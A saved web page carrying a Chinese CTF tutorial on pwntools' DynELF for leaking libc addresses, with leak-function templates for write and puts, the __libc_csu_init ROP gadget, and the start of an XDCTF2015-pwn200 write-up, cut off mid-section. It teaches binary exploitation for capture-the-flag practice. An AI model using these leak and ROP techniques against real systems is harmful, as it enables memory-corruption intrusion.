@@ -1,0 +1,872 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns:wb="http://open.weibo.com/wb" xml:lang="en" lang="en">
+<head>
+    <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+    <meta name="viewport"
+          content="width=device-width,initial-scale=1,minimum-scale=1,maximum-scale=1,user-scalable=no"/>
+    <link rel="shortcut icon" href="http://bobao.360.cn/favicon.ico?v=1.1"/>
+    <link rel="alternate" title="安全资讯" href="/rss?type=news" type="application/rss+xml"/>
+    <link rel="alternate" title="安全知识" href="/rss?type=learning" type="application/rss+xml"/>
+    <link rel="alternate" title="安全圈活动" href="/rss?type=activity" type="application/rss+xml"/>
+    <link rel="alternate" title="所有漏洞" href="/rss?type=vul" type="application/rss+xml"/>
+    <link rel="alternate" title="通用型漏洞" href="/rss?type=commonvul" type="application/rss+xml"/>
+    <link rel="alternate" title="事件型漏洞" href="/rss?type=eventvul" type="application/rss+xml"/>
+    <link rel="alternate" title="热门漏洞" href="/rss?type=hotvul" type="application/rss+xml"/>
+
+        <title>【技术分享】借助DynELF实现无libc的漏洞利用小结 - 安全客 - 有思想的安全新媒体</title>
+    
+        <meta name="keywords" content="DynELF,libc,漏洞利用"/>
+    
+        <meta name="description" content="本文针对linux下的puts和write，分别给出了实现DynELF关键函数leak的方法，并通过3道CTF题目介绍了这些方法的具体应用情况。"/>
+        <meta property="wb:webmaster" content="224437c7be31d633"/>
+
+    <script type="text/javascript" src="http://s7.qhimg.com/!56caa871/xpc_sync_height.js"></script>
+    <link rel="stylesheet" type="text/css" href="/css/reset.css" />
+    <link rel="stylesheet" type="text/css" href="/css/common_new.css?v=4.4.2.1" />
+    <link rel="stylesheet" type="text/css" href="/css/jquery.notyfy.css" />
+    <link rel="stylesheet" type="text/css" href="/css/notyfy.theme.default.css" />
+    <link rel="stylesheet" type="text/css" href="/css/s_common.css?v=2.2.7" media="only screen and
+    (max-device-width:900px), only screen and (max-width:900px)" />
+    <script type="text/javascript" src="/js/jquery.min.js?v=3.1"></script>
+    <script type="text/javascript" src="/js/jquery.notyfy.js"></script>
+    <script type="text/javascript" src="/js/iscroll.js"></script>
+    <script src="http://js.passport.qihucdn.com/5.0.3.js"></script>
+    <script type="text/javascript">
+        var myScroll, myNavScroll;
+
+        function iscrollLoaded() {
+            myScroll = new IScroll('#wrapper',
+                {
+                    scrollX: true,
+                    scrollY: false,
+                    bounceEasing: 'circular',
+                    eventPassthrough: true,
+                    preventDefault: false,
+                    bounceTime: 500
+                }
+            );
+        }
+
+        $(function () {
+
+            //导航横向滚动
+
+
+            function setNavWidth() {
+
+                /* 计算导航宽度 */
+                var allWidth = $(window).width();
+                var scroller = $('#scroller');
+
+                if (allWidth > 900) {
+                    scroller.find('ul').add(scroller.find('.scroll')).removeAttr('style');
+                    scroller.css('overflow', 'visible');
+                    if (myNavScroll) myNavScroll.destroy();
+                } else {
+
+                    var width = 0;
+                    scroller.find('.scroll').children('ul').children('li').each(function (index, el) {
+                        if (!$(this).hasClass('mobile-hide')) {
+                            width += $(this).outerWidth();
+                        }
+                    });
+                    scroller.find('ul').add(scroller.find('.scroll')).width(width);
+
+                    if (myNavScroll) myNavScroll.destroy();
+
+                    myNavScroll = new IScroll('#scroller', {
+                        scrollX: true,
+                        scrollY: false,
+                        momentum: false,
+                        click: true
+                    });
+
+                }
+
+            }
+
+            setNavWidth();
+            $(window).resize(function (event) {
+                setNavWidth();
+            });
+
+        });
+
+    </script>
+</head>
+<body onload="iscrollLoaded();">
+<div style='margin:0 auto;width:0px;height:0px;overflow:hidden;'>
+    <img src=""/>
+</div>
+
+<div id="is-mobile"></div>
+<div class="container">
+        <div class="mobile-header">
+        <div class="header clearfix">
+            <div class="header-wrapper clearfix">
+                <a href="/index/index" class="logo"><img class="slogan" src="/img/logo.png?v=1.5"/></a>
+                                <form id="search" class="search-box" action="/search/index" method="GET">
+                    <input class="keys" name="keywords" type="text" placeholder="搜索漏洞" required="required">
+                    <input class="icon" type="submit" value="">
+                    <input type="hidden" name="type" value=""/>
+                </form>
+                <div class="bug">
+                    <div class="name"><span class="seled">全部</span><i class="arrow"></i></div>
+                    <ul class="typelist">
+                        <li data-index="3"><a href="javascript:void(0);">全部</a></li>
+                        <li data-index="0"><a href="javascript:void(0);">漏洞</a></li>
+                        <li data-index="1"><a href="javascript:void(0);">资讯</a></li>
+                        <li data-index="2"><a href="javascript:void(0);">知识</a></li>
+                    </ul>
+                </div>
+                                <div class="logNreg mobile-hide">
+                    <div class="unlog">
+                        <i></i>
+                        <a href="log.html" class="log">登录</a>
+                        <span>|</span>
+                        <a href="reg.html" class="reg">注册</a>
+                    </div>
+                    <div class="loged">
+                        <a href="/member/profile" class="user-center"><i></i><span class="user-name-tag">个人中心</span></a>
+                        <div class="user-links">
+                            <span class="arrow"></span>
+                            <ul>
+                                <li class="account-setting"><a href="http://i.360.cn/profile/accountmanage"
+                                                               target="_blank"><i></i><span>账号设置</span></a></li>
+                                <li class="alert-setting"><a href="/keywords/index"
+                                                             target="_blank"><i></i><span>告警设置</span></a></li>
+                                <li class="bug-alert"><a href="/myalarm/index" target="_blank"><i></i><span>漏洞告警</span></a>
+                                </li>
+                                <li class="my-knowl"><a href="/mylearn/index" target="_blank"><i></i><span>我的知识</span></a>
+                                </li>
+                                <li class="my-knowl"><a href="/mycourse/index" target="_blank"><i></i><span>我的课堂</span></a>
+                                </li>
+                                <li class="my-exit"><a
+                                            href="http://login.360.cn/?src=pcw_adlab&op=logout&destUrl=http://bobao.360.cn"><i></i><span>退出系统</span></a>
+                                </li>
+                            </ul>
+                        </div>
+
+                        <a href="/message" class="message-center" target="_blank"><i></i><span>我的消息</span></a>
+                        <div class="message-links">
+                            <span class="arrow"></span>
+                            <ul>
+                                <li class="account-setting" style="display:none;"><a href="/myres/index"
+                                                                                     target="_blank"><i></i><span>回复我的</span></a>
+                                </li>
+                                <li class="my-bug"><a href="/myvul/index"
+                                                      target="_blank"><i></i><span>我的漏洞</span></a></li>
+                                <!--<li class="my-bug"><a href="/myres/index" target="_blank"><i></i><span>我的评论</span></a></li>-->
+                                <!--<li class="alert-setting"><a href="###" target="_blank"><i></i><span>提到我的</span></a>
+                                </li>-->
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <style type="text/css">
+            .nav {
+                overflow: hidden;
+            }
+
+            .nav .scroll {
+                width: auto;
+            }
+        </style>
+        <div id="wrapper">
+            <div id="scroller" class="nav">
+                <div class="scroll">
+                    <ul class="nav-list">
+                        <li ><a class="link-nav"
+                                                                                 href="/index/index">首页</a>
+                        </li>
+                        <li >
+                        <a class="link-nav" href="/vul/index">漏洞</a>
+                        </li>
+                        <li >
+                        <a class="link-nav" href="/introduce/list">招聘</a>
+                        </li>
+                        <li >
+                        <a class="link-nav" href="/news/index">资讯</a><!--<i class="arrow mobile-hide"></i>
+                        <ul class="subnav-list mobile-hide">
+                            <li><a class="link-subnav" href="/introduce/list">招聘</a></li>
+                        </ul>
+			-->
+                        </li>
+                        <li class="cur">
+                        <a class="link-nav" href="/learning/index">知识</a><i class="arrow mobile-hide"></i>
+                        <ul class="subnav-list mobile-hide">
+                            <li><a class="link-subnav" href="/course/index">学院</a></li>
+                        </ul>
+                        </li>
+                        <li ><a class="link-nav"
+                                                               href="/activity/index">活动</a></li>
+                        <li class="mobile-hide "><a class="link-nav"
+                                                                                                   href="/ctf/index">CTF训练营</a>
+                        </li>
+                        <li ><a class="link-nav"
+                                                               href="/interref/list">安全内参</a></li>
+                        <li ><a class="link-nav" href="/app/index">APP</a></li>
+
+                        <!--<li ><a href="/course/index">学院</a></li>-->
+                        <!--<li ><a href="/introduce/list">招聘</a></li>-->
+                        <!--<li  class="mobile-hide"><a href="/ctf/index">CTF训练营</a></li>-->
+                    </ul>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <div class="mobile-content">
+        <link rel="stylesheet" type="text/css" href="/css/news.css?v=3.5" />
+<link rel="stylesheet" type="text/css" href="/ue/SyntaxHighlighter/shCoreDefault.css?v=1.0" />
+<style>
+    p .syntaxhighlighter {
+        width: 80%;
+    }
+</style>
+
+<div class="cur-pos w1000">当前位置：<a href="http://bobao.360.cn/">安全客</a> &gt;&gt; 知识详情</div>
+
+<div class="content clearfix">
+    <div class="main">
+        <div class="article">
+            <div id="article_box">
+                <h2>【技术分享】借助DynELF实现无libc的漏洞利用小结</h2>
+                <div class="article-msg">
+                    <span class="time">2016-12-15 17:17:07</span>
+                    
+                                        <span class="read">阅读：29268次</span>
+                    <span><a style="display: none;" class="good" href="javascript:;"
+                             data-target="/learning/good" data-value="g_3298"
+                             data-type="learning">点赞(0)</a></span>
+                    <span><a class="fav" href="javascript:;" data-target="/mylearning/add"
+                             data-pk="3298" data-type="learning">收藏</a></span>
+                                        <span><a style="margin-left: 4px;" class="fav" href=""
+                             target="_blank">来源： 安全客</a></span>
+                    
+                    
+                    <div style="margin-top:10px; ">
+                        <a href="/member/contribute?uid=2802113352" style="color:#848e99;">
+                            <img src="http://p1.qhmsg.com/dm/150_150_100/t00df551a583a87f4e9.jpg" data-is-avatar="true"
+                                 style="border: 1px solid #d5d5d5;padding: 2px; width: 80px;height: 80px;border-radius: 43px;"/>
+                        </a>
+
+                    </div>
+                    <span class="orig">作者：<a href="/member/contribute?uid=2802113352" style="color:#848e99;">tianyi201612</a></span>
+                                    </div>
+                <hr size="1">
+                <div class="article-msg">
+                    <p><!-- JiaThis Button BEGIN -->
+
+<!--
+<span class="jiathis_style"><span class="jiathis_txt">分享到：</span>
+	<a class="jiathis_button_weixin"></a>
+	<a class="jiathis_button_tsina"></a>
+    <a class="jiathis_button_tqq"></a>
+    <a class="jiathis_button_qzone"></a>
+    <a class="jiathis_button_renren"></a>
+    <a class="jiathis_button_xiaoyou"></a>
+    <a href="http://www.jiathis.com/share" class="jiathis jiathis_txt jiathis_separator jtico jtico_jiathis" target="_blank"></a>
+</span>
+
+-->
+</p>
+                </div>
+                <p><p style="text-align:center"><img src="http://p2.qhimg.com/t0131ca04c8afeeeac2.jpg" title="t0131ca04c8afeeeac2.jpg" alt="http://p2.qhimg.com/t0131ca04c8afeeeac2.jpg"/></p><p style="text-align: left; text-indent: 2em;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 18px;"></span></strong></p><p style="margin: 0px 25px 8px; padding: 0px; line-height: 25px; color: rgb(70, 79, 85); word-break: break-all; font-family: Helvetica, &quot;Hiragino Sans GB&quot;, &quot;Microsoft Yahei&quot;, 微软雅黑, serif; white-space: normal; background-color: rgb(255, 255, 255); text-indent: 2em; text-align: left;"><span style="color: rgb(0, 112, 192); font-size: 18px; font-weight: 900; font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">作者：</span><a href="http://bobao.360.cn/member/contribute?uid=2802113352" target="_blank" style="text-decoration: none;"><span style="color: rgb(0, 112, 192); font-size: 18px; font-weight: 900; font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">tianyi201612</span></a></p><p style="margin: 0px 25px 8px; padding: 0px; line-height: 25px; color: rgb(70, 79, 85); word-break: break-all; font-family: Helvetica, &quot;Hiragino Sans GB&quot;, &quot;Microsoft Yahei&quot;, 微软雅黑, serif; white-space: normal; background-color: rgb(255, 255, 255); text-indent: 2em; text-align: left;"><span style="color: rgb(0, 112, 192); font-size: 18px; font-weight: 900; font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">预估稿费：400RMB（不服你也来投稿啊！）</span></p><p style="margin: 0px 25px 8px; padding: 0px; line-height: 25px; color: rgb(70, 79, 85); word-break: break-all; font-family: Helvetica, &quot;Hiragino Sans GB&quot;, &quot;Microsoft Yahei&quot;, 微软雅黑, serif; white-space: normal; background-color: rgb(255, 255, 255); text-indent: 2em; text-align: left;"><span style="color: rgb(0, 112, 192); font-size: 18px; font-weight: 900; font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span><span style="font-weight: 900; color: rgb(0, 112, 192); font-size: 18px; font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">投稿方式：发送邮件至<a href="mailto:linwei@360.cn" target="_self" style="text-decoration: none; color: rgb(51, 51, 51); line-height: 28px;"><span style="color: rgb(0, 112, 192);">linwei#360.cn</span></a>，或登陆<a href="http://bobao.360.cn/contribute/index" target="_blank" style="text-decoration: none; color: rgb(0, 112, 192); line-height: 28px;">网页版</a>在线投稿</span></p><p style="text-align: left; text-indent: 2em;"><br style="text-align: left;"/></p><p style="text-align: left; text-indent: 2em;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 18px;">前言</span></strong></p><p style="text-align: left; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><hr/><p style="text-align: left; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">在没有目标系统libc文件的情况下，我们可以使用pwntools的DynELF模块来泄漏地址信息，从而获取到shell。本文针对linux下的puts和write，分别给出了实现DynELF关键函数leak的方法，并通过3道CTF题目介绍了这些方法的具体应用情况。</span><br style="text-align: left;"/></p><p><br style="text-align: left;"/></p><p style="text-align: left; text-indent: 2em;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 18px;">DynELF</span></strong></p><p style="text-align: left; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><hr/><p style="text-align: left; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">DynELF是pwntools中专门用来应对无libc情况的漏洞利用模块，其基本代码框架如下。</span></p><pre class="brush:bash;toolbar:false">p&nbsp;=&nbsp;process(&#39;./xxx&#39;)
+def&nbsp;leak(address):
+&nbsp;&nbsp;#各种预处理
+&nbsp;&nbsp;payload&nbsp;=&nbsp;&quot;xxxxxxxx&quot;&nbsp;+&nbsp;address&nbsp;+&nbsp;&quot;xxxxxxxx&quot;
+&nbsp;&nbsp;p.send(payload)
+&nbsp;&nbsp;#各种处理
+&nbsp;&nbsp;data&nbsp;=&nbsp;p.recv(4)
+&nbsp;&nbsp;log.debug(&quot;%#x&nbsp;=&gt;&nbsp;%s&quot;&nbsp;%&nbsp;(address,&nbsp;(data&nbsp;or&nbsp;&#39;&#39;).encode(&#39;hex&#39;)))
+&nbsp;&nbsp;return&nbsp;data
+d&nbsp;=&nbsp;DynELF(leak,&nbsp;elf=ELF(&quot;./xxx&quot;))&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#初始化DynELF模块&nbsp;
+systemAddress&nbsp;=&nbsp;d.lookup(&#39;system&#39;,&nbsp;&#39;libc&#39;)&nbsp;&nbsp;#在libc文件中搜索system函数的地址</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">需要使用者进行的工作主要集中在leak函数的具体实现上，上面的代码只是个模板。其中，address就是leak函数要泄漏信息的所在地址，而payload就是触发目标程序泄漏address处信息的攻击代码。</span><br/><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><p style="text-align: left; text-indent: 2em;"><strong style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 18px;"><br style="text-align: left;"/></span></strong></p><p style="text-align: left; text-indent: 2em;"><strong style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 18px;">使用条件</span></strong></p><p style="text-align: left; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><hr/><p style="text-align: left; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">不管有没有libc文件，要想获得目标系统的system函数地址，首先都要求目标二进制程序中存在一个能够泄漏目标系统内存中libc空间内信息的漏洞。同时，由于我们是在对方内存中不断搜索地址信息，故我们需要这样的信息泄露漏洞能够被反复调用。以下是大致归纳的主要使用条件：</span><br style="text-align: left;"/></p><p style="text-align: left; text-indent: 2em;"><span style="color: rgb(227, 108, 9);"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">1）目标程序存在可以泄露libc空间信息的漏洞，如read@got就指向libc地址空间内；</span></strong></span></p><p style="text-align: left; text-indent: 2em;"><span style="color: rgb(227, 108, 9);"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">2）目标程序中存在的信息泄露漏洞能够反复触发，从而可以不断泄露libc地址空间内的信息。</span></strong><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></strong></span></p><p style="text-align: left; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">当然，以上仅仅是实现利用的基本条件，不同的目标程序和运行环境都会有一些坑需要绕过。接下来，我们主要针对write和puts这两个普遍用来泄漏信息的函数在实际配合DynELF工作时可能遇到的问题，给出相应的解决方法。</span></p><p><br style="text-align: left;"/></p><p style="text-align: left; text-indent: 2em;"><strong style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 18px;">write函数</span></strong></p><p style="text-align: left; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><hr/><p style="text-align: left; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">write函数原型是write(fd,&nbsp;addr,&nbsp;len)，即将addr作为起始地址，读取len字节的数据到文件流fd（0表示标准输入流stdin、1表示标准输出流stdout）。write函数的优点是可以读取任意长度的内存信息，即它的打印长度只受len参数控制，缺点是需要传递3个参数，特别是在x64环境下，可能会带来一些困扰。</span><br style="text-align: left;"/></p><p style="text-align: left; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">在x64环境下，函数的参数是通过寄存器传递的，rdi对应第一个参数，rsi对应第二个参数，rdx对应第三个参数，往往凑不出类似“pop&nbsp;rdi;&nbsp;ret”、“pop&nbsp;rsi;&nbsp;ret”、“pop rdx;&nbsp;ret”等3个传参的gadget。此时，可以考虑使用__libc_csu_init函数的通用gadget，具体原理请参见</span><a href="http://www.cnblogs.com/Ox9A82/p/5487725.html" style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-decoration: underline;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">文章</span></a><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">。简单的说，就是通过__libc_csu_init函数的两段代码来实现3个参数的传递，这两段代码普遍存在于x64二进制程序中，只不过是间接地传递参数，而不像原来，是通过pop指令直接传递参数。</span></p><p style="text-align: left; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">第一段代码如下：</span></p><pre class="brush:bash;toolbar:false">.text:000000000040075A&nbsp;&nbsp;&nbsp;pop&nbsp;&nbsp;rbx&nbsp;&nbsp;#需置为0，为配合第二段代码的call指令寻址
+.text:000000000040075B&nbsp;&nbsp;&nbsp;pop&nbsp;&nbsp;rbp&nbsp;&nbsp;#需置为1
+.text:000000000040075C&nbsp;&nbsp;&nbsp;pop&nbsp;&nbsp;r12&nbsp;&nbsp;#需置为要调用的函数地址，注意是got地址而不是plt地址，因为第二段代码中是call指令
+.text:000000000040075E&nbsp;&nbsp;&nbsp;pop&nbsp;&nbsp;r13&nbsp;&nbsp;#write函数的第三个参数
+.text:0000000000400760&nbsp;&nbsp;&nbsp;pop&nbsp;&nbsp;r14&nbsp;&nbsp;#write函数的第二个参数
+.text:0000000000400762&nbsp;&nbsp;&nbsp;pop&nbsp;&nbsp;r15&nbsp;&nbsp;#write函数的第一个参数
+.text:0000000000400764&nbsp;&nbsp;&nbsp;retn</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">第二段代码如下：</span><br/><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><pre class="brush:bash;toolbar:false">.text:0000000000400740&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;rdx,&nbsp;r13
+.text:0000000000400743&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;rsi,&nbsp;r14
+.text:0000000000400746&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;edi,&nbsp;r15d
+.text:0000000000400749&nbsp;&nbsp;&nbsp;call&nbsp;&nbsp;qword&nbsp;ptr&nbsp;[r12+rbx*8]</pre></span><p style="text-align: left; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">这两段代码运行后，会将栈顶指针移动56字节，我们在栈中布置56个字节即可。</span></p><p style="text-align: left; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">这样，我们便解决了write函数在leak信息中存在的问题，具体的应用会放到后面的3道题目中讲。<br style="text-align: left;"/></span></p><p><br style="text-align: left;"/></p><p style="text-align: left; text-indent: 2em;"><strong style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 18px;">puts函数</span></strong></p><p style="text-align: left; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><hr/><p style="text-align: left; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">puts的原型是puts(addr)，即将addr作为起始地址输出字符串，直到遇到“\x00”字符为止。也就是说，puts函数输出的数据长度是不受控的，只要我们输出的信息中包含\x00截断符，输出就会终止，且会自动将“\n”追加到输出字符串的末尾，这是puts函数的缺点，而优点就是需要的参数少，只有1个，无论在x32还是x64环境下，都容易调用。</span><br style="text-align: left;"/></p><p style="text-align: left; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">为了克服输入不受控这一缺点，我们考虑利用puts函数输出的字符串最后一位为“\n“这一特点，分两种情况来解决。</span></p><p style="text-align: left; text-indent: 2em;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; color: rgb(227, 108, 9);">（1）puts输出完后就没有其他输出</span></strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">，</span><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">在这种情况下的leak函数可以这么写。</span></p><pre class="brush:bash;toolbar:false">def&nbsp;leak(address):
+&nbsp;&nbsp;count&nbsp;=&nbsp;0
+&nbsp;&nbsp;data&nbsp;=&nbsp;&#39;&#39;
+&nbsp;&nbsp;payload&nbsp;=&nbsp;xxx
+&nbsp;&nbsp;p.send(payload)
+&nbsp;&nbsp;print&nbsp;p.recvuntil(&#39;xxx\n&#39;)&nbsp;#一定要在puts前释放完输出
+&nbsp;&nbsp;up&nbsp;=&nbsp;&quot;&quot;
+&nbsp;&nbsp;while&nbsp;True:
+&nbsp;&nbsp;&nbsp;&nbsp;#由于接收完标志字符串结束的回车符后，就没有其他输出了，故先等待1秒钟，如果确实接收不到了，就说明输出结束了
+&nbsp;&nbsp;&nbsp;&nbsp;#以便与不是标志字符串结束的回车符（0x0A）混淆，这也利用了recv函数的timeout参数，即当timeout结束后仍得不到输出，则直接返回空字符串””
+&nbsp;&nbsp;&nbsp;&nbsp;c&nbsp;=&nbsp;p.recv(numb=1,&nbsp;timeout=1)
+&nbsp;&nbsp;&nbsp;&nbsp;count&nbsp;+=&nbsp;1
+&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;up&nbsp;==&nbsp;&#39;\n&#39;&nbsp;and&nbsp;c&nbsp;==&nbsp;&quot;&quot;:&nbsp;&nbsp;#接收到的上一个字符为回车符，而当前接收不到新字符，则
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;buf&nbsp;=&nbsp;buf[:-1]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#删除puts函数输出的末尾回车符
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;buf&nbsp;+=&nbsp;&quot;\x00&quot;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break
+&nbsp;&nbsp;&nbsp;&nbsp;else:
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;buf&nbsp;+=&nbsp;c
+&nbsp;&nbsp;&nbsp;&nbsp;up&nbsp;=&nbsp;c
+&nbsp;&nbsp;data&nbsp;=&nbsp;buf[:4]&nbsp;&nbsp;#取指定字节数
+&nbsp;&nbsp;log.info(&quot;%#x&nbsp;=&gt;&nbsp;%s&quot;&nbsp;%&nbsp;(address,&nbsp;(data&nbsp;or&nbsp;&#39;&#39;).encode(&#39;hex&#39;)))
+&nbsp;&nbsp;return&nbsp;data</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><p style="text-align: left; text-indent: 2em;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; color: rgb(227, 108, 9);">（2）puts输出完后还有其他输出</span></strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">，</span><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">在这种情况下的leak函数可以这么写。</span></p><pre class="brush:bash;toolbar:false">def&nbsp;leak(address):
+&nbsp;&nbsp;count&nbsp;=&nbsp;0
+&nbsp;&nbsp;data&nbsp;=&nbsp;&quot;&quot;
+&nbsp;&nbsp;payload&nbsp;=&nbsp;xxx
+&nbsp;&nbsp;p.send(payload)
+&nbsp;&nbsp;print&nbsp;p.recvuntil(&quot;xxx\n&quot;))&nbsp;#一定要在puts前释放完输出
+&nbsp;&nbsp;up&nbsp;=&nbsp;&quot;&quot;
+&nbsp;&nbsp;while&nbsp;True:
+&nbsp;&nbsp;&nbsp;&nbsp;c&nbsp;=&nbsp;p.recv(1)
+&nbsp;&nbsp;&nbsp;&nbsp;count&nbsp;+=&nbsp;1
+&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;up&nbsp;==&nbsp;&#39;\n&#39;&nbsp;and&nbsp;c&nbsp;==&nbsp;&quot;x&quot;:&nbsp;&nbsp;#一定要找到泄漏信息的字符串特征
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;data&nbsp;=&nbsp;buf[:-1]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;data&nbsp;+=&nbsp;&quot;\x00&quot;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break
+&nbsp;&nbsp;&nbsp;&nbsp;else:
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;buf&nbsp;+=&nbsp;c
+&nbsp;&nbsp;&nbsp;&nbsp;up&nbsp;=&nbsp;c
+&nbsp;&nbsp;data&nbsp;=&nbsp;buf[:4]&nbsp;
+&nbsp;&nbsp;log.info(&quot;%#x&nbsp;=&gt;&nbsp;%s&quot;&nbsp;%&nbsp;(address,&nbsp;(data&nbsp;or&nbsp;&#39;&#39;).encode(&#39;hex&#39;)))
+&nbsp;&nbsp;return&nbsp;data</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span><br/></p><p style="text-align: left; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 18px;">其他需要注意的地址</span></strong></span></p><p style="text-align: left; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><hr/><p style="text-align: left; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">在信息泄露过程中，由于循环制造溢出，故可能会导致栈结构发生不可预料的变化，可以尝试调用目标二进制程序的_start函数来重新开始程序以恢复栈。</span><br style="text-align: left;"/></p><p><br style="text-align: left;"/></p><p style="text-align: left; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 18px;">XDCTF2015-pwn200</span></strong></span></p><p style="text-align: left; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><hr/><p style="text-align: left; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">本题是32位linux下的二进制程序，无cookie，存在很明显的栈溢出漏洞，且可以循环泄露，符合我们使用DynELF的条件。具体的栈溢出位置等调试过程就不细说了，只简要说一下<span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; color: rgb(227, 108, 9);"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">借助DynELF实现利用的要点：</span></strong></span></span><br style="text-align: left;"/></p><p style="text-align: left; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">&nbsp;1）调用write函数来泄露地址信息，比较方便；</span></p><p style="text-align: left; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">&nbsp;2）32位linux下可以通过布置栈空间来构造函数参数，不用找gadget，比较方便；</span></p><p style="text-align: left; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft 